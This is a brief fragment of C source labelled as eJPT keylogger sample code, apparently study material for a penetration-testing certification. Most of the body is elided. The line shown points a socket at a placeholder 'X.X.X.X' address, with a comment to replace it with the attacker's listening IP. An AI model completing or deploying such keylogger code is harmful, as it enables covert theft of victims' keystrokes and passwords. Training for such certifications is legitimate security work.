// eJPT Keylogger Sample Code - ** Not my Own ** //
...
int main()
{
    ...
    addr.sin_addr.s_addr = inet_addr("X.X.X.X"); /* specify the target of the network connection - replace the ip with your listening (tap0) ip address */
